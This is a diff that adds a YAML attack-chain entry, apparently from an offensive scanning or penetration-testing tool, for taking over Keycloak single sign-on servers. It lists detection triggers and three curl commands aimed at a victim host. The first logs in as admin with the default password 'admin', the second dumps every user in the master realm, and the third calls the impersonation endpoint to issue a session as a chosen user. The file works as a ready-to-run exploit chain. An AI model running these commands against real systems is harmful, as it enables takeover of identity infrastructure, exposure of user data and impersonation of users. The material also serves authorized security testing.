@@ -1,0 +1,40 @@
+chain_id: keycloak_default_admin
+title: "Keycloak — admin:admin / admin:Pa55w0rd default master realm"
+severity: CRITICAL
+tags: [web, keycloak, default-creds, sso, identity]
+
+trigger:
+  any_of:
+    - { banner_pattern: "(?i)keycloak" }
+    - { product_pattern: "(?i)keycloak" }
+    - { path_pattern: "(?i)/(auth/admin|auth/realms/master|realms/master/protocol/openid-connect)" }
+
+description: |
+  Keycloak / Red Hat SSO ships with no admin user, forcing the operator
+  to bootstrap one on first run. `admin:admin` and `admin:Pa55w0rd` are
+  the most common mistakes. Master realm admin = compromise of every
+  realm and every federated service.
+
+steps:
+  - id: 1
+    title: "Default-cred probe via the admin console"
+    command: |
+      curl -s -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
+        -d 'client_id=admin-cli&grant_type=password&username=admin&password=admin' \
+        http://$VICTIMA:8080/auth/realms/master/protocol/openid-connect/token
+
+  - id: 2
+    title: "On a successful 200, pull every user across every realm"
+    command: |
+      ACCESS_TOKEN=$(... obtained above ...)
+      curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
+        http://$VICTIMA:8080/auth/admin/realms/master/users | jq
+
+  - id: 3
+    title: "Forge a token impersonating a target user"
+    command: |
+      curl -s -X POST -H "Authorization: Bearer $ACCESS_TOKEN" \
+        "http://$VICTIMA:8080/auth/admin/realms/master/users/$USER_ID/impersonation"
+
+references:
+  - https://www.keycloak.org/docs/latest/server_admin/
